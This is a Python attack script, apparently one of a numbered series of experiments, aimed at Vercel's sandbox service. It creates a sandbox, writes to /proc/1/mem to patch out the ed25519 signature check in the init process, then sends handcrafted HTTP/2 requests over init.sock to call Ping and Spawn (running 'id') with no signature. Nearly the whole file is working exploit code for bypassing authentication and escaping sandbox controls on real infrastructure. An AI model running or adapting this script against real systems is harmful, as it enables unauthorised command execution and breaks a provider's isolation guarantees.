# -*- coding: utf-8 -*-
"""实验J261: 新二进制 patch 验证 - init.sock 免签名调用
patch 点: 0x77bb83 (Verifier.verify 内 call ed25519) e8f841e2ff -> 31c0909090
验证: patch 后 init.sock h2 prior knowledge 调 Ping (无签名头) 是否通过
对照: patch 前同样请求 (应拒绝)
"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj261"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) patch 前基线: init.sock h2 Ping (无签名头) - 应被拒
CODE_A = r'''
import socket, struct, base64, time
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
def h2_request(path, body, timeout=6):
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect("/run/vercel/share/init.sock")
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    def fr(t, flags, sid, payload):
        return struct.pack(">I", len(payload))[:3] + bytes([t, flags]) + struct.pack(">I", sid & 0x7fffffff) + payload
    sock.sendall(fr(4, 0, 0, b""))
    headers = (
        b":method: POST\r\n:scheme: http\r\n:path: " + path + b"\r\n:authority: init\r\n"
        b"content-type: application/json\r\nconnect-protocol-version: 1\r\n"
        b"content-length: " + str(len(body)).encode() + b"\r\n"
    )
    hp = base64.b64encode(headers)
    sock.sendall(fr(1, 0x4, 1, b"\x00" + hp))
    sock.sendall(fr(0, 0x1, 1, body))
    data = b""
    try:
        while True:
            d = sock.recv(4096)
            if not d:
                break
            data += d
            if len(data) > 30000:
                break
    except socket.timeout:
        p("TIMEOUT after", len(data))
    except Exception as e:
        p("READ_ERR", type(e).__name__, str(e)[:80])
    sock.close()
    return data

r = h2_request(b"/vercel.sandbox.spawn.v1.SpawnService/Ping", b"{}")
p("BASELINE_RESP", len(r))
asc = "".join(chr(b) if 32 <= b < 127 else "." for b in r)
p("BASELINE_ASC", asc[:500])
'''
run_cmd(sid, CODE_A, "A_BASELINE", timeout=120)

# B) patch: 0x77bb83 call -> xor eax,eax
CODE_B = r'''
import os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x77bb83, 5)
p("OLD", old.hex())
if old == bytes.fromhex("e8f841e2ff"):
    wa(0x77bb83, bytes.fromhex("31c0909090"))
    p("PATCHED", ra(0x77bb83, 5).hex())
else:
    p("PATTERN_DIFF", old.hex())
os.close(fd)
'''
run_cmd(sid, CODE_B, "B_PATCH", timeout=100)

# C) patch 后: init.sock h2 Ping (无签名头)
CODE_C = r'''
import socket, struct, base64
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
def h2_request(path, body, timeout=8):
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect("/run/vercel/share/init.sock")
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    def fr(t, flags, sid, payload):
        return struct.pack(">I", len(payload))[:3] + bytes([t, flags]) + struct.pack(">I", sid & 0x7fffffff) + payload
    sock.sendall(fr(4, 0, 0, b""))
    headers = (
        b":method: POST\r\n:scheme: http\r\n:path: " + path + b"\r\n:authority: init\r\n"
        b"content-type: application/json\r\nconnect-protocol-version: 1\r\n"
        b"content-length: " + str(len(body)).encode() + b"\r\n"
    )
    hp = base64.b64encode(headers)
    sock.sendall(fr(1, 0x4, 1, b"\x00" + hp))
    sock.sendall(fr(0, 0x1, 1, body))
    data = b""
    try:
        while True:
            d = sock.recv(4096)
            if not d:
                break
            data += d
            if len(data) > 30000:
                break
    except socket.timeout:
        p("TIMEOUT after", len(data))
    except Exception as e:
        p("READ_ERR", type(e).__name__, str(e)[:80])
    sock.close()
    return data

r = h2_request(b"/vercel.sandbox.spawn.v1.SpawnService/Ping", b"{}")
p("PATCHED_RESP", len(r))
asc = "".join(chr(b) if 32 <= b < 127 else "." for b in r)
p("PATCHED_ASC", asc[:600])
'''
run_cmd(sid, CODE_C, "C_PING", timeout=120)

# D) patch 后: Spawn (执行命令)
CODE_D = r'''
import socket, struct, base64, time
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
def h2_request(path, body, timeout=10):
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect("/run/vercel/share/init.sock")
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    def fr(t, flags, sid, payload):
        return struct.pack(">I", len(payload))[:3] + bytes([t, flags]) + struct.pack(">I", sid & 0x7fffffff) + payload
    sock.sendall(fr(4, 0, 0, b""))
    headers = (
        b":method: POST\r\n:scheme: http\r\n:path: " + path + b"\r\n:authority: init\r\n"
        b"content-type: application/json\r\nconnect-protocol-version: 1\r\n"
        b"content-length: " + str(len(body)).encode() + b"\r\n"
    )
    hp = base64.b64encode(headers)
    sock.sendall(fr(1, 0x4, 1, b"\x00" + hp))
    sock.sendall(fr(0, 0x1, 1, body))
    data = b""
    try:
        while True:
            d = sock.recv(4096)
            if not d:
                break
            data += d
            if len(data) > 30000:
                break
    except socket.timeout:
        p("TIMEOUT after", len(data))
    except Exception as e:
        p("READ_ERR", type(e).__name__, str(e)[:80])
    sock.close()
    return data

import json as _j
# SpawnRequest: command/args
req = _j.dumps({"command": "id", "args": [], "env": {}}).encode()
r = h2_request(b"/vercel.sandbox.spawn.v1.SpawnService/Spawn", req)
p("SPAWN_RESP", len(r))
asc = "".join(chr(b) if 32 <= b < 127 else "." for b in r)
p("SPAWN_ASC", asc[:600])
'''
run_cmd(sid, CODE_D, "D_SPAWN", timeout=120)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
